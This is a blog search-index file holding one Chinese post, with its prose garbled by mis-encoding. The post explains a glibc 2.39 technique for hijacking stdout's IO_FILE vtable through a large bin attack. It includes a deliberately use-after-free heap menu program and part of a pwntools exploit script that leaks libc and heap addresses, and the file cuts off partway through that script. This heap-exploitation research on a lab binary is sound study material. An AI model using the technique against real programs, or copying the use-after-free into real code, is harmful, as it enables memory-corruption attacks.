<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ä¸€ç±»æ–°çš„IO_FILEåˆ©ç”¨è§¦å‘æ–¹å¼</title>
    <link href="/2025/02/14/post-1/"/>
    <url>/2025/02/14/post-1/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰å­¦IOçš„æ—¶å€™å°±æœ‰è¿™ä¸ªæƒ³æ³•äº†ï¼Œè¿‡äº†å°†è¿‘ä¸‰ä¸ªæœˆæ‰æœ‰æ—¶é—´å»éªŒè¯ğŸ¥²</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨IOæ”»å‡»çš„è§¦å‘æ–¹æ³•ä¸­ï¼Œä¸»è¦åˆ†ä¸ºæ‰§è¡Œ<code>exit</code>å‡½æ•°å’Œé€šè¿‡æ”»å‡»<code>stderr</code>åæ‰§è¡Œ<code>__malloc_assert</code>ã€‚åœ¨<code>glibc 2.36</code>ä¹‹å<code>__malloc_assert</code>è¢«ç§»é™¤ï¼Œ<code>large bin chunk</code>ä¸­ï¼Œè¾ƒä¸ºçƒ­é—¨çš„<code>FSOP</code>å’Œ<code>rtld_global</code>ç›¸å…³çš„æ”»å‡»éƒ½ç›¸å½“ä¾èµ–<code>exit</code>å‡½æ•°ã€‚æœ¬æ–‡å°†åˆ†äº«ä¸€ä¸ªå…³æ³¨æ”»å‡»<code>stdout</code>çš„è§†è§’ï¼Œå¸Œæœ›èƒ½ç»™å„ä½å¸ˆå‚…åœ¨é«˜ç‰ˆæœ¬çš„å †åˆ©ç”¨ä¸­æä¾›æ›´å¤šæ–¹å‘çš„å°è¯•ã€‚</p><h2 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h2><p>åœ¨<code>glibc</code>ä¸­ï¼Œæ ‡å‡†IOåº“å‡½æ•°å¦‚<code>gets</code>, <code>printf</code>, <code>puts</code>, <code>scanf</code>ç­‰ï¼Œå®ƒä»¬çš„æ‰§è¡Œè¿‡ç¨‹ä¸­éƒ½ä¼šé€šè¿‡<code>stdin</code>æˆ–<code>stdout</code>è°ƒç”¨<code>IO_file_jumps</code>è™šè¡¨ä¸­çš„å‡½æ•°ã€‚æˆ‘ä»¬ç”¨<code>puts</code>æ¥ä¸¾ä¾‹å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc 2.39-0ubuntu8.3 /libio/ioputs.c at line 31:46</span><br><span class="hljs-type">int</span> <br>_IO_puts(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)<br>&#123;<br>  <span class="hljs-type">int</span> result = EOF;<br>  <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span>(str);<br>  _IO_acquire_lock(<span class="hljs-built_in">stdout</span>);<br>  <br>  <span class="hljs-keyword">if</span> ((_IO_vtable_offset(<span class="hljs-built_in">stdout</span>) != <span class="hljs-number">0</span> <br>  || _IO_fwide(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>) <br>      &amp;&amp; _IO_sputn(<span class="hljs-built_in">stdout</span>, str, len) == len <br>      &amp;&amp; _IO_putc_unlocked(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-built_in">stdout</span>) != EOF)<br>    result = MIN(INT_MAX, len + <span class="hljs-number">1</span>);<br><br>  _IO_release_lock(<span class="hljs-built_in">stdout</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>_IO_sputn</code>æ˜¯ä¸€ä¸ªå®ï¼Œå±•å¼€åæ˜¯ç”¨äº<code>call</code>å¯¹åº”<code>_IO_FILE</code>ä¸­<code>vtable</code>ä¸­<code>_IO_sputn</code>åç§»çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN(__fp, __s, __n)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2(__xsputn, FP, DATA, N)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC)(THIS, X1, X2)</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span><br><span class="hljs-meta">  (IO_validate_vtable                                                   \</span><br><span class="hljs-meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus(THIS)\</span><br><span class="hljs-meta">     + (THIS)-&gt;_vtable_offset)))</span><br><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼š<code>call</code>åˆ°<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sputn</code></p><p>è€Œ<code>stdout</code>ä¸<code>stdin</code>å’Œ<code>stderr</code>ä¸€æ ·ï¼Œéƒ½æ˜¯å¯¹<code>_IO_2_1_stdxx_</code>çš„å°è£…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc 2.39-0ubuntu8.3 /libio/stdio.c at line 33:35</span><br>FILE *<span class="hljs-built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;<br>FILE *<span class="hljs-built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;<br>FILE *<span class="hljs-built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;<br></code></pre></td></tr></table></figure><p>å› æ­¤ç†è®ºä¸Šæ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŒ…æ‹¬ä½†ä¸é™äº<code>large bin attack</code>è¦†ç›–<code>stdin</code>æˆ–<code>stdout</code>ï¼Œåœ¨æ‰§è¡Œç›¸å…³æ ‡å‡†IOåº“å‡½æ•°çš„æ—¶å€™è§¦å‘æ”»å‡»ã€‚</p><h2 id="ç ”ç©¶æ–¹æ³•"><a href="#ç ”ç©¶æ–¹æ³•" class="headerlink" title="ç ”ç©¶æ–¹æ³•"></a>ç ”ç©¶æ–¹æ³•</h2><p>æ ‡å‡†IOåº“å‡½æ•°å¾ˆå¤šï¼Œå¦‚æœæˆ‘ä»¬è¦ä¸€ä¸ªä¸ªå»è¯»æºä»£ç æ¥æ‰¾ä»–ä»¬æ‰§è¡Œçš„ç¬¬ä¸€ä¸ª<code>IO_FILE</code>è™šè¡¨å‡½æ•°æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚å› æ­¤åœ¨å®é™…çš„æ¢ç´¢ä¸­ï¼Œæˆ‘æ˜¯ç”¨gdbå°†æ‰€æœ‰<code>IO_FILE_jumps</code>ä¸­çš„å‡½æ•°éƒ½æ‰“äº†æ–­ç‚¹ã€‚è¿™æ ·å¯ä»¥æ–¹ä¾¿çš„çœ‹å‡ºæ¥ï¼Œæ¯ä¸ªåº“å‡½æ•°è°ƒç”¨çš„ç¬¬ä¸€ä¸ªè™šè¡¨å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b _IO_file_finish</span><br><span class="hljs-string">b _IO_file_overflow</span><br><span class="hljs-string">b _IO_file_underflow</span><br><span class="hljs-string">b _IO_default_uflow</span><br><span class="hljs-string">b _IO_default_pbackfail</span><br><span class="hljs-string">b _IO_file_xsputn</span><br><span class="hljs-string">b _IO_file_xsgetn</span><br><span class="hljs-string">b _IO_file_seekoff</span><br><span class="hljs-string">b _IO_default_seekpos</span><br><span class="hljs-string">b _IO_file_setbuf</span><br><span class="hljs-string">b _IO_file_sync</span><br><span class="hljs-string">b _IO_file_doallocate</span><br><span class="hljs-string">b _IO_file_read</span><br><span class="hljs-string">b _IO_file_write</span><br><span class="hljs-string">b _IO_file_seek</span><br><span class="hljs-string">b _IO_file_close</span><br><span class="hljs-string">b _IO_file_stat</span><br><span class="hljs-string">b _IO_default_showmanyc</span><br><span class="hljs-string">b _IO_default_imbue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>æ›´å¥½çš„åŠæ³•æ˜¯ä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶ï¼Œ<code>break</code> åˆ°æƒ³è¦çš„å‡½æ•°å†<code>source</code>ä¸€ä¸‹</p><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><h4 id="Heap-menu"><a href="#Heap-menu" class="headerlink" title="Heap-menu"></a>Heap-menu</h4><p>ç¯å¢ƒ:<code>glibc 2.39-0ubuntu8.3</code></p><p>æˆ‘å®ç°äº†ä¸€ä¸ªæœ€ç®€å•çš„èœå•å †ç”¨äºæµ‹è¯•ï¼ŒåŒ…å«ä»»æ„sizeå¤§å°ç”³è¯·ï¼Œdeleteéƒ¨åˆ†æœ‰UAFã€‚æºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CHUNKS 100</span><br><br><span class="hljs-type">void</span> *chunks[MAX_CHUNKS];<br><span class="hljs-type">int</span> size_list[MAX_CHUNKS];<br><span class="hljs-type">int</span> chunk_count = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">malloc_chunk</span><span class="hljs-params">()</span> &#123;<br>Â  Â  <span class="hljs-keyword">if</span> (chunk_count &gt;= MAX_CHUNKS) &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maximum chunks reached.\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-keyword">return</span>;<br>Â  Â  &#125;<br>Â  Â  <span class="hljs-type">size_t</span> size;<br>Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter size to malloc: \n&quot;</span>);<br>Â  Â  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%zx&quot;</span>, &amp;size);<br>Â  Â  chunks[chunk_count] = <span class="hljs-built_in">malloc</span>(size); <br>Â  Â  <span class="hljs-keyword">if</span> (chunks[chunk_count]) &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocated chunk at index %d\n&quot;</span>, chunk_count);<br>Â  Â  Â  Â  size_list[chunk_count] = size;<br>Â  Â  Â  Â  chunk_count++;<br>Â  Â  &#125; <span class="hljs-keyword">else</span> &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Malloc failed.\n&quot;</span>);<br>Â  Â  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_chunk</span><span class="hljs-params">()</span> &#123;<br>Â  Â  <span class="hljs-type">int</span> idx;<br>Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter chunk index to print: \n&quot;</span>);<br>Â  Â  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>Â  Â  <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt; chunk_count) &#123;<br>Â  Â  Â  Â  write(<span class="hljs-number">1</span>, chunks[idx], size_list[idx]);<br>Â  Â  &#125; <span class="hljs-keyword">else</span> &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid index.\n&quot;</span>);<br>Â  Â  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free_chunk</span><span class="hljs-params">()</span> &#123;<br>Â  Â  <span class="hljs-type">int</span> idx;<br>Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter chunk index to free: \n&quot;</span>);<br>Â  Â  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>Â  Â  <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt; chunk_count) &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">free</span>(chunks[idx]);<br>Â  Â  &#125; <span class="hljs-keyword">else</span> &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid index.\n&quot;</span>);<br>Â  Â  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">()</span>&#123;<br>Â  Â  <span class="hljs-type">int</span> idx;<br>Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter chunk index to edit: \n&quot;</span>);<br>Â  Â  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;idx);<br>Â  Â  <span class="hljs-keyword">if</span> (idx &gt;= <span class="hljs-number">0</span> &amp;&amp; idx &lt; chunk_count) &#123;<br>Â  Â  Â  Â  read(<span class="hljs-number">0</span>, chunks[idx], size_list[idx]);<br>Â  Â  &#125; <span class="hljs-keyword">else</span> &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid index.\n&quot;</span>);<br>Â  Â  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_input_buffer</span><span class="hljs-params">()</span> &#123;<br>Â  Â  <span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>Â  Â  <span class="hljs-type">int</span> choice;<br>Â  Â  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nHeap Playground Menu:\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1. Malloc a chunk\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2. Print chunk info\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3. Modify chunk info\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4. Free a chunk\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5. Exit\n&quot;</span>);<br>Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter your choice: \n&quot;</span>);<br>Â  Â  Â  Â  <br>Â  Â  Â  Â  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice) != <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// æ£€æŸ¥è¾“å…¥</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid input. Please enter a number.\n&quot;</span>);<br>Â  Â  Â  Â  Â  Â  clear_input_buffer(); <span class="hljs-comment">// æ¸…ç©ºè¾“å…¥ç¼“å†²åŒº</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// ç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯</span><br>Â  Â  Â  Â  &#125;<br><br>Â  Â  Â  Â  <span class="hljs-keyword">switch</span> (choice) &#123;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: malloc_chunk(); <span class="hljs-keyword">break</span>;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: print_chunk(); <span class="hljs-keyword">break</span>;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: edit_chunk(); <span class="hljs-keyword">break</span>;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: free_chunk(); <span class="hljs-keyword">break</span>;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// case 5: exit(0);</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">default</span>: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid choice.\n&quot;</span>);<br>Â  Â  Â  Â  &#125;<br>Â  Â  &#125;<br><br>Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘ä»¬å°è¯•ä½¿ç”¨<code>large bin attack</code> æ”»å‡»<code>stdout</code>ï¼Œç”±äº<code>large bin attack</code>çš„æœ€åä¸€æ­¥æ˜¯<code>malloc chunk</code>ã€‚æ¥ä¸‹æ¥ç¬¬ä¸€ä¸ªä½¿ç”¨<code>stdout</code>çš„æ˜¯<code>printf</code>ã€‚æˆ‘ä»¬å°†æ–­ç‚¹æ‰“åˆ°<code>printf</code>ï¼Œå¹¶ç”¨è„šæœ¬æ‰“ä¸Šæ‰€æœ‰æ–­ç‚¹ï¼ŒæŸ¥çœ‹<code>printf</code>æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªstdioåº“å‡½æ•°</p><p><img src="/./post-1/1.png"></p><p>å¯ä»¥å‘ç°æ˜¯<code>_IO_file_xsputn</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è°ƒæ•´<code>fake_IO_FILE-&gt;vtable</code>ï¼Œæ„é€ <code>house of apple2</code></p><p>exp:</p><blockquote><p>å·æ‡’æŠ„äº†åˆšå­¦FSOPæ—¶å€™çš„æ¨¡æ¿ï¼Œlarge bin leak å’Œattackçš„éƒ¨åˆ†å†™çš„è¶…è‡ƒè‚¿ï¼Œæ»‘è½¨äº†</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>io = process(<span class="hljs-string">&quot;./heap-menu&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/new/gdb_commands.gdb&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> gdb_file:<br>Â  Â  gdb_file.write(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set debug-file-directory </span><br><span class="hljs-string">set directories </span><br><span class="hljs-string">Â  Â  Â  Â  &#x27;&#x27;&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="hljs-comment"># /lib/x86_64-linux-gnu/libc.so.6</span><br><br><span class="hljs-comment"># gdb.attach(io)</span><br><br>index = -<span class="hljs-number">1</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">idx</span>):<br>Â  Â  io.sendlineafter(<span class="hljs-string">b&quot;Enter your choice:&quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>Â  Â  <span class="hljs-keyword">global</span> index<br>Â  Â  choice(<span class="hljs-number">1</span>)<br>Â  Â  io.sendlineafter(<span class="hljs-string">b&quot;Enter size to malloc:&quot;</span>, <span class="hljs-built_in">hex</span>(size).encode())<br>Â  Â  index = index + <span class="hljs-number">1</span><br>Â  Â  <span class="hljs-keyword">return</span> index<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>Â  Â  choice(<span class="hljs-number">4</span>)<br>Â  Â  io.sendlineafter(<span class="hljs-string">b&quot;Enter chunk index to free:&quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>Â  Â  choice(<span class="hljs-number">3</span>)<br>Â  Â  io.sendlineafter(<span class="hljs-string">b&quot;Enter chunk index to edit: &quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>Â  Â  io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>Â  Â  choice(<span class="hljs-number">2</span>)<br>Â  Â  io.sendlineafter(<span class="hljs-string">b&quot;Enter chunk index to print:&quot;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>Â  Â  io.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">large_bin_leak</span>(<span class="hljs-params">libc_offset = <span class="hljs-literal">None</span>, heap_offset = <span class="hljs-literal">None</span></span>):<br>Â  Â  chunk = add(<span class="hljs-number">0x500</span>)<br>Â  Â  add(<span class="hljs-number">0x20</span>)<br>Â  Â  free(chunk)<br>Â  Â  add(<span class="hljs-number">0x700</span>)<br>Â  Â  show(chunk)<br>Â  Â  <br>Â  Â  arena = u64(io.recv(<span class="hljs-number">16</span>)[<span class="hljs-number">8</span>:])<br>Â  Â  <span class="hljs-keyword">if</span> libc_offset:<br>Â  Â  Â  Â  libc_address = arena - libc_offset<br>Â  Â  <span class="hljs-keyword">else</span>:<br>Â  Â  Â  Â  libc_address = arena<br>Â  Â  Â  Â  <br>Â  Â  heap = u64(io.recv(<span class="hljs-number">16</span>)[<span class="hljs-number">8</span>:])<br>Â  Â  <span class="hljs-keyword">if</span> heap_offset:<br>Â  Â  Â  Â  heap_base = heap - heap_offset<br>Â  Â  <span class="hljs-keyword">else</span>:<br>Â  Â  Â  Â  heap_base = heap<br>Â  Â  <span class="hljs-keyword">return</span> libc_address, heap_base<br><br>  <br><br>libc.address, heap_base = large_bin_leak(libc_offset = <span class="hljs-number">0x203f50</span>, heap_offset = <span class="hljs-number">0x16b0</span>)<br>success(<span class="hljs-string">f&quot;leak -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br>success(<span class="hljs-string">f&quot;heap_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)<br>fake_IO_FILE = heap_base + <span class="hljs-number">0x2d40</span><br><br>add(<span 